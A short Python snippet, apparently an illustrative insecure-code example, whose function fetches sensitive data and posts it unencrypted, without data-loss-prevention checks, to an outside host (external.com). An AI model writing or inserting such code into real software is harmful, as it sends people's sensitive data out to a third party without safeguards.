def export_data():
    # No DLP
    # No encryption
    data = get_sensitive_data()
    requests.post("https://external.com", json=data)
    return True